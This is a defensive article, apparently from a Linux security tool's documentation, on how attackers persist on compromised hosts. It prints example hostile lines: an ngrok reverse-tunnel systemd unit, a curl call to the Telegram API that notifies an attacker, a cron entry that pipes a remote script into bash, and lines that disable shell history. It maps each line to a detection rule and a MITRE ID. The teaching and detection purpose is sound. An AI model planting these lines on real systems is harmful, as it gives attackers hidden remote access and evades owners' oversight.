---
description: >-
  How attackers persist on a compromised Linux host — systemd units, cron, and defense
  evasion — with real examples of the exact patterns to look for.
---

# How attackers persist on a compromised Linux host

Getting in is only step one for an attacker. Persistence — surviving a reboot, staying reachable
even behind a firewall, and not showing up in an obvious place — is what turns a one-time
compromise into a standing foothold. On Linux, that almost always means one of a small number of
well-worn mechanisms: a systemd unit, a cron entry, or quietly disabling the logging that would
otherwise catch the first two. This is a walkthrough of the actual patterns, grounded in the
detection rules [Bulwark](/) runs for each.

## systemd units: the modern autorun

A systemd unit file is a legitimate, ordinary way to run something on boot — which is exactly
why it's such a good persistence mechanism. A malicious unit looks, structurally, identical to a
normal one; only its `ExecStart=` command gives it away.

**Reverse tunnels.** The single most common pattern:

```ini
[Service]
ExecStart=/usr/local/bin/ngrok tcp 22
Restart=always
```

A tunneling tool (ngrok, cloudflared, `serveo`, localtunnel, or a raw `ssh -R` reverse tunnel)
opens an *outbound* connection that the attacker connects back through. This is deliberately
chosen over an inbound listener: outbound connections routinely sail past firewall rules that
would block anything trying to listen for incoming traffic, and `Restart=always` means it
survives both reboots and manual kills. Bulwark's `BLWK-PERSIST-001` matches `ExecStart` against
exactly this class of tool — MITRE catalogs the mechanism as
[T1543.002 (Create or Modify System Process: Systemd Service)](https://attack.mitre.org/techniques/T1543/002/)
and the tunnel itself as [T1572 (Protocol Tunneling)](https://attack.mitre.org/techniques/T1572/).

**Exfil notifications.** A close cousin:

```ini
ExecStart=/bin/sh -c 'curl -s -X POST https://api.telegram.org/bot.../sendMessage -d text=up'
```

A unit that shells out to `curl` against a chat API (Telegram, Discord webhooks, Slack) on every
start is commonly used to notify the attacker — for instance, of a freshly-rotated tunnel URL —
every time the service restarts. `BLWK-PERSIST-002` looks for exactly this `curl` + messaging-API
combination.

The fix, if you find either: `systemctl disable --now <unit>`, remove the unit file from
`/etc/systemd/system/`, and — because a unit like this implies the host was already
compromised — rotate any credentials the machine had access to. Don't stop at removing the unit.

## Cron: the older, still-effective autorun

Cron predates systemd by decades and is just as usable for persistence, with one specific
pattern worth knowing by sight:

```
* * * * * curl -s https://example.net/update.sh | bash
```

A downloader piped straight into a shell. This is a favorite because it hides the actual payload
from the host entirely — nothing malicious is ever written to disk between runs, only fetched
and executed in memory each time. It also means the attacker can change what runs at any time,
on their own schedule, without touching the compromised host again. Bulwark's `BLWK-ACCT-001`
matches this `curl|wget ... | sh` shape specifically, across `crontab`, `/etc/cron.d/`, and the
systemd-timer equivalents — MITRE's entry for this one is
[T1053.003 (Scheduled Task/Job: Cron)](https://attack.mitre.org/techniques/T1053/003/).

## Defense evasion: covering the tracks

Persistence alone isn't enough if the activity that set it up is sitting in plain sight in shell
history. A simple, common evasion step:

```bash
# in ~/.bashrc or ~/.zshrc
export HISTSIZE=0
unset HISTFILE
```

Setting `HISTSIZE=0` or clearing `HISTFILE` means every command run in that shell — including
the one that installed the persistence mechanism in the first place — leaves no trace. This
isn't always malicious; some people do this deliberately for privacy on a shared machine. But
it's worth *confirming* which, rather than assuming. `BLWK-EVASION-001` flags shell startup
files that suppress history recording, precisely so this gets a second look instead of a pass —
MITRE tracks it as
[T1070.003 (Indicator Removal: Clear Command History)](https://attack.mitre.org/techniques/T1070/003/).

## Why these three, specifically

There's a long tail of persistence techniques —
[MITRE ATT&CK's Persistence tactic](https://attack.mitre.org/tactics/TA0003/) alone lists dozens of
sub-techniques. These three (systemd, cron, and history suppression) are the ones
that show up overwhelmingly often in real opportunistic compromises of Linux desktops and
small servers, because they require no special privilege beyond what a compromised user account
already has, they're simple to set up, and — critically — they're static configuration that sits
on disk after the fact. That last property is what makes them detectable: a periodic scan that
reads `/etc/systemd/system/`, crontab, and shell startup files will catch a persistence mechanism
long after the initial intrusion happened, even if nothing was watching in real time when it was
planted.

That's the actual design premise behind Bulwark: rather than trying to catch an intrusion at the
exact moment it happens (which needs kernel-level real-time monitoring — eBPF, Falco-style —
explicitly out of scope for a v1 desktop tool), catch the durable *evidence* it leaves behind,
on a schedule short enough to matter. The desktop app does this continuously on the machine
you're using, with a file watcher on exactly the paths above (`/etc/systemd/system/`, crontab,
shell startup files), so a unit planted this afternoon surfaces this afternoon; `bulwarkctl scan`
runs the same rules over SSH on a server. See the [architecture doc](/guide/architecture) for the
full reasoning, or the [SSH hardening checklist](/articles/ssh-hardening-checklist) for the other
half of the picture — how the attacker most likely got in to begin with.

## References

- [MITRE ATT&CK: Persistence (TA0003)](https://attack.mitre.org/tactics/TA0003/) — the full catalog these three techniques sit inside.
- [T1543.002 — Create or Modify System Process: Systemd Service](https://attack.mitre.org/techniques/T1543/002/), and [T1572 — Protocol Tunneling](https://attack.mitre.org/techniques/T1572/) for the reverse-tunnel `ExecStart`.
- [T1053.003 — Scheduled Task/Job: Cron](https://attack.mitre.org/techniques/T1053/003/) — the cron downloader.
- [T1070.003 — Indicator Removal: Clear Command History](https://attack.mitre.org/techniques/T1070/003/) — `HISTSIZE=0` / `unset HISTFILE`.
- [Bulwark's rule pack](https://github.com/vietanhdev/bulwark/tree/main/rules) — `BLWK-PERSIST-001`/`002`, `BLWK-ACCT-001` and `BLWK-EVASION-001` as shipped, each carrying the ATT&CK reference above as a structured field (see [the mapping](/articles/cis-mitre-mapping)).
